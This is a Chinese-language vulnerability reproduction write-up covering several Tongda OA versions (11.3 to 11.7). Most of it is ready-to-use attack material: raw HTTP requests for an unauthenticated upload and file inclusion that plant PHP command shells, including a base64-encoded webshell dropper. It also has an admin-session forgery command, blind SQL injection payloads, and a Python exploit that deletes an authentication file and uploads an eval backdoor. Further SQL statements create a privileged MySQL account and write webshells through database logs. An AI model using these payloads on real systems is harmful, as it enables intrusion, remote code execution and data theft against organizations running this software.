

# 通达OA 11.3

## 通达OA前台任意文件上传漏洞+文件包含漏洞导致getshell

### 漏洞环境

靶机（Windows server 2008 R2）IP：192.168.163.146:8080

通达OA：V 11.3版本



### 漏洞影响版本

通达OA V11版 <= 11.3 20200103
通达OA 2017版 <= 10.19 20190522
通达OA 2016版 <= 9.13 20170710
通达OA 2015版 <= 8.15 20160722
通达OA 2013增强版 <= 7.25 20141211
通达OA 2013版 <= 6.20 20141017

**备注：**

无需登录，前台即可实现漏洞利用

> 2013版：
>
> 文件上传漏洞路径：/ispirit/im/upload.php
>
> 文件包含漏洞路径：/ispirit/interface/gateway.php
>
> 
>
> 2017版：
>
> 文件上传漏洞路径：/ispirit/im/upload.php
>
> 文件包含漏洞路径：/mac/gateway.php



### 漏洞复现

#### 图片马上传

前台任意文件上传漏洞：无需登录，抓取任意数据包，修改数据包进行重放，上传后缀为jpg的木马文件

```
POST /ispirit/im/upload.php HTTP/1.1
Host: 192.168.163.146:8080
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
Connection: close
Content-Length: 662

------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="UPLOAD_MODE"

2
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="P"

123
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="DEST_UID"

1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
Content-Type: image/jpeg

<?php
$command=$_POST['cmd'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>

------WebKitFormBoundarypyfBh1YB4pV8McGB--
```

得到200状态码，获得图片名称：`1354502767.jpg`

![image-20210409132616556](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409132616556.png)

```
+OK [vm]252@2104_2141129852|jpg|0[/vm]
```



#### 文件包含图片马

前台文件包含漏洞：修改数据包，包含前面上传的jpg木马文件，即可实现执行任意命令。

此处执行命令“net user”

```
POST /ispirit/interface/gateway.php HTTP/1.1
Host: 192.168.163.146:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: textml,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 70

json={"url":"/general/../../attach/im/2104/2141129852.jpg"}&cmd=whoami
```

查看到命令被成功执行了！

![image-20210408161457971](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210408161457971.png)



#### Getshell

前台任意文件上传漏洞：抓取任意数据包，修改数据包进行重放，上传后缀为jpg的木马文件（木马文件执行写入文件操作，写一个新的木马脚本：shell.php）

```
POST /ispirit/im/upload.php HTTP/1.1
Host: 192.168.16.112:8080
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
Connection: close
Content-Length: 1398

------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="UPLOAD_MODE"

2
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="P"

123
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="DEST_UID"

1
------WebKitFormBoundarypyfBh1YB4pV8McGB
Content-Disposition: form-data; name="ATTACHMENT"; filename="jpg"
Content-Type: image/jpeg

<?php
$fp = fopen('shell.php', 'w');
$a = base64_decode("PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwppZiAoaXNzZXQoJF9HRVRbJ3Bhc3MnXSkpCnsKICAgICRrZXk9c3Vic3RyKG1kNSh1bmlxaWQocmFuZCgpKSksMTYpOwogICAgJF9TRVNTSU9OWydrJ109JGtleTsKICAgIHByaW50ICRrZXk7Cn0KZWxzZQp7CiAgICAka2V5PSRfU0VTU0lPTlsnayddOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC  ﻿
4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiRrZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJHApIHtldmFsKCRwLiIiKTt9fQoJQG5ldyBDKCRwYXJhbXMpOwp9Cj8+");
fwrite($fp, $a);
fclose($fp);
?>

------WebKitFormBoundarypyfBh1YB4pV8McGB--
```

获得文件路径

```
+OK [vm]259@2104_456656689|jpg|0[/vm]
```

包含这个图片马，生成一个木马文件，会在文件包含的根目录下生成一个 shell.php文件

```
POST /ispirit/interface/gateway.php HTTP/1.1
Host: 192.168.16.112:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 73

json={"url":"/general/../../attach/im/2104/456656689.jpg"}&cmd=ipconfig
```







## 通达OA前台任意用户登录

### 影响版本

通达OA <11.5.200417版本，通达OA 2017版本



### 漏洞复现

访问下面的网址，提示需要登录

```
http://192.168.16.112:8080/general/index.php?isIE=0&modify_pwd=0
```

使用poc生成PHPSESSID ，再次访问该网址并抓包，替换cookie中的PHPSESSID为用poc生成的。放包，成功以系统管理员身份登录。

poc脚本获取地址：https://github.com/NS-Sp4ce/TongDaOA-Fake-User

```
python3 tongda_admin.py -v 11 -url http://192.168.16.112:8080/
```

获得 `COOKIE:PHPSESSID=4s7t89n55e20uh8dl5i4ak0vn5`

登录成功

![image-20210409142510681](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409142510681.png)







## 通达OA前台SQL注入复现

登录-个人事务-日程安排-日程查询

![image-20210409145256353](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409145256353.png)

抓包后点击，截取数据包

![image-20210409145337314](images/%E9%80%9A%E8%BE%BEOA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.assets/image-20210409145337314.png)

保存到文件，sqlmap跑一下，注入成功

```
python3 sqlmap.py -r 1.txt
```

![image-20210409145454661](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409145454661.png)



# 通达OA 11.5

## SQL注入1——id参数

利用条件：一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入

webroot\general\appbuilder\modules\report\controllers\RepdetailController.php，actionEdit函数中存在 一个$_GET["id"]; 未经过滤，拼接到SQL

登录test用户，抓包URL，Sqlmap跑一下

```
http://192.168.16.112:8080/general/appbuilder/web/report/repdetail/edit?link_type=false&slot={}&id=2
```

![image-20210409174727847](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409174727847.png)

发现跑出了两



## SQL注入2——starttime参数

与11.3的SQL注入一样，注入点在：“登录-个人事务-日程安排-日程查询”

抓包Sqlmap跑一下



## SQL注入3——orderby参数

利用条件：一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入

这里sqlmap跑不出来

参数位置：(两处)

```
http://192.168.16.112:8080/general/email/inbox/get_index_data.php?asc=0&boxid=&boxname=inbox&curnum=0&emailtype=ALLMAIL&keyword=&orderby=3--&pagelimit=10&tag=&timestamp=1598069103&total=
```

```
http://192.168.16.112:8080/general/email/sentbox/get_index_data.php?asc=0&boxid=&boxname=sentbox&curnum=3&emailtype=ALLMAIL&keyword=sample%40email.tst&orderby=1&pagelimit=20&tag=&timestamp=1598069133&total=
```



插入sql盲注语句，下图证明存在布尔盲注

```
rlike (select (case when (1=1) then 1 else 0x28 end))
```

![image-20210409180855404](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409180855404.png)

使用手工注入，经过测试发现过滤了单引号，对r字符进行转换成16进制

```
rlike (select (case when (substr(user(),1,1)='r') then 1 else 0x28 end))
```

```
rlike (select (case when (substr(user(),1,1)=0x72) then 1 else 0x28 end))
```

![image-20210409181224477](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409181224477.png)





## SQL注入4——SORT_ID，FILE_SORT参数

payload：

```
rlike (select (case when (1=1) then 1 else 0x28 end))
```

如下图，证明存在布尔盲注

```
POST /general/file_folder/swfupload_new.php HTTP/1.1
Host: 192.168.163.146:8080
Pragma: no-cache
x-requested-with: XMLHttpRequest
Content-Length: 413
x-wvs-id: Acunetix-Deepscan/186
Cache-Control: no-cache
accept: */*
origin: http://192.168.202.1
Accept-Language: en-US
Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2

------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_ID"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="ATTACHMENT_NAME"

1
------------GFioQpMK0vv2
Content-Disposition: form-data; name="FILE_SORT"

2
------------GFioQpMK0vv2
Content-Disposition: form-data; name="SORT_ID"

0 rlike (select (case when (1=1) then 1 else 0x28 end))
------------GFioQpMK0vv2--
```

可以看到，这里存在布尔盲注

![image-20210409184751007](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409184751007.png)

经过测试发现过滤了单引号，对r字符进行转换成16进制,通过手工最终获得数据库用户名root

```
rlike (select (case when (substr(user(),1,1)='r') then 1 else 0x28 end))
```

```
rlike (select (case when (substr(user(),1,1)=0x72) then 1 else 0x28 end))
```





# 通达OA 11.6

## 影响版本

11.6



## 漏洞复现

脚本内容如下，核心思路就是删除网站里的一个名为auth.inc.php的文件，进而越权拿shell

一句话木马的连接密码为：x，最后蚁剑连一下

```python
import requests
target="http://192.168.16.112:8080/"     # 此处填写上面安装oa的ip及端口
payload="<?php eval($_POST['x']);?>"
print("[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA")
input("Press enter to continue")
print("[*]Deleting auth.inc.php....")

url=target+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"
requests.get(url=url)
print("[*]Checking if file deleted...")
url=target+"/inc/auth.inc.php"
page=requests.get(url=url).text
if 'No input file specified.' not in page:
    print("[-]Failed to deleted auth.inc.php")
    exit(-1)
print("[+]Successfully deleted auth.inc.php!")
print("[*]Uploading payload...")
url=target+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
files = {'FILE1': ('deconf.php', payload)}
requests.post(url=url,files=files)
url=target+"/_deconf.php"
page=requests.get(url=url).text
if 'No input file specified.' not in page:
    print("[+]Filed Uploaded Successfully")
    print("[+]URL:",url)
else:
    print("[-]Failed to upload file")
```

![image-20210409191007550](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409191007550.png)





# 通达OA 11.7

后台sql注入



## 影响版本

通达oa 11.7

利用条件:需要账号登录 



## 漏洞复现

### condition_cascade参数存在布尔盲注

在人员管理面板有一个SQL注入

![image-20210409191824931](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409191824931.png)

POC：

```
GET /general/hr/manage/query/delete_cascade.php?condition_cascade=select if((substr(user(),1,1)='r'),1,power(9999,99)) HTTP/1.1
Host: 192.168.77.137
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
X-Requested-With: XMLHttpRequest
Referer: http://192.168.77.137/general/index.php?isIE=0&modify_pwd=0
Cookie: PHPSESSID=ebpjtm5tqh5tvida5keba73fr0; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c71fa06d
DNT: 1
Connection: close
```

经过测试，过滤了一些函数(sleep、报错的函数等等)，各种注释，使用payload：

```
select if((1=1),1,power(9999,99))、select if((1=2),1,power(9999,99))
```

判断注入点 #当字符相等时，不报错，错误时报错

![image-20210409193004810](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409193004810.png)



通过添加用户at666，密码为abcABC@123

```
grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION
```

![image-20210409194021160](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409194021160.png)



使用工具连接数据库，刚刚添加的用户无法直接通过日志慢查询写入文件，需要给创建的账户添加权限

```
UPDATE `mysql`.`user` SET `Password` = '*DE0742FA79F6754E99FDB9C8D2911226A5A9051D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('at666' AS Binary(5));
```



然后用注入点刷新权限，因为该用户是没有刷新权限的权限的

```
general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;
```

![image-20210409194101029](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/image-20210409194101029.png)



再次登录，提示密码过期，需要重新执行grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION

![img](https://antlersmaskdown.oss-cn-hangzhou.aliyuncs.com/1592114-20200918145636404-104307491.png)



然后写shell

方法一:

```
select @@basedir;
set global slow_query_log=on;
set global slow_query_log_file='C:/tongda11.7/webroot/test.php';
select '<?php eval($_POST[x]);?>' or sleep(11);
```

方法二:

```
select @@basedir;
set global general_log = on;
set global general_log_file ='C:/tongda11.7/webroot/test2.php';
select '<?php eval($_POST[test2]);?>';
show variables like '%general%';
```

最后拿蚁剑连接